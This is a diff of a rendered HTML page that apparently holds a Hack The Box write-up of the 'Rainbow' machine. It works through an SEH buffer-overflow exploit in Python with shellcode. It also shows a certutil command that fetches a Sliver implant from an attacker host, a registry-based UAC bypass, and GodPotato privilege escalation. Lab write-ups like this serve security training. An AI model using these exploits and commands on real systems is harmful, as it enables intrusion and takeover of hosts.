@@ -72,7 +72,7 @@
             body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
             body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
         </style><meta name="panzoom-theme" content="material">
-<meta name="panzoom-data" content='{"selectors": [".mermaid", ".d2"], "initial_zoom_level": 1.0}'> </head>
+<meta name="panzoom-data" content='{"selectors": [".d2", ".mermaid"], "initial_zoom_level": 1.0}'> </head>
   
   
     
@@ -91,7 +91,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#static-analysis" class="md-skip">
+        <a href="#nmap-scan" class="md-skip">
           Skip to content
         </a>
       
@@ -613,8 +613,19 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
-        
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Rainbow
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
@@ -627,6 +638,140 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap scan
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#static-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Static Analysis
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dynamic-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dynamic analysis
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-a-crash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding a crash
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-the-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding the pattern
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-badchars" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding Badchars
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-poppopret" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding PopPopRet
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#to-seh-or-nseh-that-is-the-question" class="md-nav__link">
+    <span class="md-ellipsis">
+      To SEH or nSEH, that is the question
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shellcode
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-a-foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      Getting a foothold
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-exploitation enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#elevate" class="md-nav__link">
+    <span class="md-ellipsis">
+      Elevate
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalate" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escalate
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -672,9 +817,10 @@
 
 
 
+  <h1>Rainbow</h1>
+
 <p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025172750.png" data-desc-position="bottom"><img alt="Pasted_image_20251025172750.png" src="../../../../Pasted_image_20251025172750.png"></a></p>
-<p>Here we go again.</p>
-<p>Start with an nmap scan.</p>
+<h2 id="nmap-scan">Nmap scan<a class="headerlink" href="#nmap-scan" title="Permanent link">¶</a></h2>
 <div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb<span class="o">]</span>
 └─$<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.129.234.171
 Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-10-25<span class="w"> </span><span class="m">11</span>:40<span class="w"> </span>PDT
@@ -899,7 +1045,7 @@ Prompting<span class="w"> </span>off<span class="w"> </span><span class="k">for<
 Port 8080 is the development webapp, its homepage aligns with the <code>index.html</code> found in the <code>wwwroot</code> directory in the FTP share.</p>
 <p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025174111.png" data-desc-position="bottom"><img alt="Pasted_image_20251025174111.png" src="../../../../Pasted_image_20251025174111.png"></a></p>
 <p>Anonymous access doesn't allow upload to the FTP share, so straight to webshell is off the table.</p>
-<h1 id="static-analysis">Static Analysis<a class="headerlink" href="#static-analysis" title="Permanent link">¶</a></h1>
+<h2 id="static-analysis">Static Analysis<a class="headerlink" href="#static-analysis" title="Permanent link">¶</a></h2>
 <p>I tried analyzing the <code>rainbow.exe</code> using <code>AvaloniaILSpy</code> (<a href="https://github.com/icsharpcode/AvaloniaILSpy">https://github.com/icsharpcode/AvaloniaILSpy</a>) but the executable isn't managed code:</p>
 <p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025174908.png" data-desc-position="bottom"><img alt="Pasted_image_20251025174908.png" src="../../../../Pasted_image_20251025174908.png"></a></p>
 <p>Examining the binary in <code>Ghidra</code>, I find that the binary has a number of imports, one of which is <code>ws2_32.dll</code>.  A good sign the binary features network connection-related operations.</p>
@@ -972,7 +1118,7 @@ The third function on line 91 is also a check if a VirtualProcessor is available
 <p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025203742.png" data-desc-position="bottom"><img alt="Pasted_image_20251025203742.png" src="../../../../Pasted_image_20251025203742.png"></a></p>
 <p>That looks an awful lot like a function pointer exec, save for the three argument being passed to it.  We can see that pointer-to-param1 is being cast as a pointer-to-code-pointer, and then getting called with three arguments.</p>
 <p>There is nothing left to analyze here at the moment.</p>
-<h1 id="dynamic-analysis">Dynamic analysis<a class="headerlink" href="#dynamic-analysis" title="Permanent link">¶</a></h1>
+<h2 id="dynamic-analysis">Dynamic analysis<a class="headerlink" href="#dynamic-analysis" title="Permanent link">¶</a></h2>
 <p>Only way forward is to debug it live.  The following can help expedite managing the lifecycle of the binary and attaching windbg to it.  one of the challenges is that the application blocks while its running, and it has console output .  So it has to be started as a background process and output redirected to a file while trying to one-liner starting and attaching to it.</p>
 <p>Additionally I have set an initial breakpoint at the instruction that calls Ordinal_16 (recv).
 </p><div class="highlight"><pre><span></span><code>c:<span class="se">\r</span>ainbow&gt;<span class="o">((</span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">"taskkill /F /IM rainbow.exe"</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe"</span><span class="w"> </span>-WF<span class="w"> </span>C:<span class="se">\w</span>indbg_custom.WEW<span class="w"> </span>-pn<span class="w"> </span>rainbow.exe<span class="w"> </span>-c<span class="w"> </span><span class="s1">'bp 0x00401971; g'</span>
@@ -1064,7 +1210,7 @@ rainbow+0x1977:
 <p>The following has two breakpoints, one at the call for recv, the other at the function call that contains the functionpointer exec.</p>
 <div class="highlight"><pre><span></span><code><span class="o">((</span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">"taskkill /F /IM rainbow.exe"</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe"</span><span class="w"> </span>-WF<span class="w"> </span>C:<span class="se">\w</span>indbg_custom.WEW<span class="w"> </span>-pn<span class="w"> </span>rainbow.exe<span class="w"> </span>-c<span class="w"> </span><span class="s1">'bp 0x00401971; bp 0x0040232f; g'</span>
 </code></pre></div>
-<h1 id="finding-a-crash">Finding a crash<a class="headerlink" href="#finding-a-crash" title="Permanent link">¶</a></h1>
+<h2 id="finding-a-crash">Finding a crash<a class="headerlink" href="#finding-a-crash" title="Permanent link">¶</a></h2>
 <p>I found that if I debug without any breakpoints, and if I send a POST request with 0x1000 bytes, I get a response back.
 </p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">2</span><span class="w"> </span>~/htb/machines/rainbow<span class="o">]</span>
 └─$<span class="w"> </span>perl<span class="w"> </span>-e<span class="w"> </span><span class="s2">"printf 'A'x0x1000"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://192.168.56.100:8080/index.html<span class="w"> </span>-d<span class="w"> </span><span class="s2">"fuzzed=</span><span class="k">$(</span>cat<span class="w"> </span>-<span class="k">)</span><span class="s2">"</span>
@@ -1085,7 +1231,7 @@ Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class
 <span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x41</span><span class="s2">"</span> <span class="o">*</span> <span class="mh">0xf00</span><span class="p">)</span>
 </code></pre></div>
 ^^ 3908 bytes total<p></p>
-<h1 id="finding-the-pattern">Finding the pattern<a class="headerlink" href="#finding-the-pattern" title="Permanent link">¶</a></h1>
+<h2 id="finding-the-pattern">Finding the pattern<a class="headerlink" href="#finding-the-pattern" title="Permanent link">¶</a></h2>
 <p>Retesting with a pattern, with the following buffer.  I'll pass the pattern string in at CLI invocation.
 </p><div class="highlight"><pre><span></span><code><span class="n">buf</span> <span class="o">=</span> <span class="s2">"POST / HTTP/1.1</span><span class="se">\x0d\x0a</span><span class="s2">Content-Type: application/x-www-form-urlencoded</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s2">"</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">][:</span><span class="mh">0xf00</span><span class="p">]</span>
@@ -1122,7 +1268,7 @@ Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class
 009dfbe4:<span class="w"> </span><span class="m">41414141</span>
 Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class="w"> </span>at<span class="w"> </span><span class="m">40404040</span>
 </code></pre></div><p></p>
-<h1 id="finding-badchars">Finding Badchars<a class="headerlink" href="#finding-badchars" title="Permanent link">¶</a></h1>
+<h2 id="finding-badchars">Finding Badchars<a class="headerlink" href="#finding-badchars" title="Permanent link">¶</a></h2>
 <p>Real quick though, test for badchars.  I have a function I built for that:</p>
 <div class="highlight"><pre><span></span><code><span class="n">badchars</span> <span class="o">=</span> <span class="s2">""</span>
 <span class="k">def</span><span class="w"> </span><span class="nf">gen_badchars</span><span class="p">(</span><span class="n">bc</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="s2">"</span><span class="se">\x01</span><span class="s2">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="p">):</span>
@@ -1208,7 +1354,7 @@ Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class
 </p><div class="highlight"><pre><span></span><code><span class="n">badchars</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x00\x0a</span><span class="s2">"</span>
 </code></pre></div><p></p>
 <p>Nothing uses the variable beyond hunting for badchars.</p>
-<h1 id="finding-poppopret">Finding PopPopRet<a class="headerlink" href="#finding-poppopret" title="Permanent link">¶</a></h1>
+<h2 id="finding-poppopret">Finding PopPopRet<a class="headerlink" href="#finding-poppopret" title="Permanent link">¶</a></h2>
 <p>Of note, only the rainbow binary will do.  Everything else has DEP and ASLR enabled, and, why fight them if you don't have to.
 </p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>!load<span class="w"> </span>narly
 
@@ -1328,7 +1474,7 @@ rainbow+0x94da:
 009ffc14<span class="w">  </span><span class="m">00000000</span><span class="w"> </span><span class="m">00000000</span><span class="w"> </span>0040b55c<span class="w"> </span>005464d0
 </code></pre></div><p></p>
 <p>Very nice, ret will return to the 0x40404040.  </p>
-<h1 id="to-seh-or-nseh-that-is-the-question">To SEH or nSEH, that is the question<a class="headerlink" href="#to-seh-or-nseh-that-is-the-question" title="Permanent link">¶</a></h1>
+<h2 id="to-seh-or-nseh-that-is-the-question">To SEH or nSEH, that is the question<a class="headerlink" href="#to-seh-or-nseh-that-is-the-question" title="Permanent link">¶</a></h2>
 <p>Not much of a question</p>
 <p>Need a small kickback, maybe 0x8 bytes.
 </p><div class="highlight"><pre><span></span><code>nasm<span class="w"> </span>&gt;<span class="w"> </span>jmp<span class="w"> </span>short<span class="w"> </span>0xf8
@@ -1391,7 +1537,7 @@ rainbow+0x94da:
 009ef980<span class="w">  </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span>
 009ef990<span class="w">  </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span>
 </code></pre></div><p></p>
-<h1 id="shellcode">Shellcode<a class="headerlink" href="#shellcode" title="Permanent link">¶</a></h1>
+<h2 id="shellcode">Shellcode<a class="headerlink" href="#shellcode" title="Permanent link">¶</a></h2>
 <p>The only thing left to do is generate the shellcode and complete the PoC.
 </p><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="w"> </span><span class="nn">re</span><span class="o">,</span><span class="w"> </span><span class="nn">socket</span><span class="o">,</span><span class="w"> </span><span class="nn">binascii</span><span class="o">,</span><span class="w"> </span><span class="nn">time</span>
@@ -1478,7 +1624,7 @@ rainbow+0x94da:
 <span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">"__main__"</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
 </code></pre></div><p></p>
-<h1 id="getting-a-foothold">Getting a foothold<a class="headerlink" href="#getting-a-foothold" title="Permanent link">¶</a></h1>
+<h2 id="getting-a-foothold">Getting a foothold<a class="headerlink" href="#getting-a-foothold" title="Permanent link">¶</a></h2>
 <p>It shells:</p>
 <p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251026063455.png" data-desc-position="bottom"><img alt="Pasted_image_20251026063455.png" src="../../../../Pasted_image_20251026063455.png"></a></p>
 <p>Flag
@@ -1486,7 +1632,7 @@ rainbow+0x94da:
 <span class="nb">type</span><span class="w"> </span>user.txt
 881288e2cd563fa856fcb4163b91ec06
 </code></pre></div><p></p>
-<h1 id="post-exploitation-enumeration">Post-exploitation enumeration<a class="headerlink" href="#post-exploitation-enumeration" title="Permanent link">¶</a></h1>
+<h2 id="post-exploitation-enumeration">Post-exploitation enumeration<a class="headerlink" href="#post-exploitation-enumeration" title="Permanent link">¶</a></h2>
 <p>Need to upgrade my shell to something a little more feature rich, reliable, etc.</p>
 <p>Download  a Sliver implant to the host
 </p><div class="highlight"><pre><span></span><code>C:<span class="se">\r</span>ainbow&gt;certutil<span class="w"> </span>-urlcache<span class="w"> </span>-f<span class="w"> </span>-split<span class="w"> </span>http://10.10.14.204:8083/10.10.14.204.exe<span class="w"> </span><span class="se">\w</span>indows<span class="se">\t</span>asks<span class="se">\a</span>.exe
@@ -1525,7 +1671,7 @@ Registry<span class="w"> </span>AutoLogon<span class="w"> </span>Found
 
 <span class="o">===</span><span class="w"> </span>Registry<span class="w"> </span><span class="nv">AutoLogons</span><span class="w"> </span><span class="o">===</span>
 </code></pre></div><p></p>
-<h1 id="elevate">Elevate<a class="headerlink" href="#elevate" title="Permanent link">¶</a></h1>
+<h2 id="elevate">Elevate<a class="headerlink" href="#elevate" title="Permanent link">¶</a></h2>
 <p>I'll try a number of UAC bypasses.  What I found worked for me is the ComputerDefaults bypass.</p>
 <div class="highlight"><pre><span></span><code><span class="nb">New-Item</span> <span class="s2">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="n">-Force</span>
 <span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="n">-Name</span> <span class="s2">"DelegateExecute"</span> <span class="n">-Value</span> <span class="s2">""</span> <span class="n">-Force</span>
@@ -1542,7 +1688,7 @@ sliver<span class="w"> </span><span class="o">(</span>REMOTE_JACKAL<span class="
 <p>I'll clean up the registry
 </p><div class="highlight"><pre><span></span><code><span class="nb">Remove-Item</span> <span class="s2">"HKCU:\Software\Classes\ms-settings\"</span> <span class="n">-Recurse</span> <span class="n">-Force</span>
 </code></pre></div><p></p>
-<h1 id="escalate">Escalate<a class="headerlink" href="#escalate" title="Permanent link">¶</a></h1>
+<h2 id="escalate">Escalate<a class="headerlink" href="#escalate" title="Permanent link">¶</a></h2>
 <p>On the new session, I find that the process integrity is High, and the process tokens include SeImpersonatePrivilege in an enabled state</p>
 <p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251026171700.png" data-desc-position="bottom"><img alt="Pasted_image_20251026171700.png" src="../../../../Pasted_image_20251026171700.png"></a></p>
 <p>Upload GodPotato
@@ -1624,7 +1770,7 @@ Logon<span class="w"> </span>ID:<span class="w"> </span>NT<span class="w"> </spa
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="October 27, 2025 00:34:25 UTC">October 27, 2025</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="October 27, 2025 23:48:12 UTC">October 27, 2025</span>
   </span>
 
     
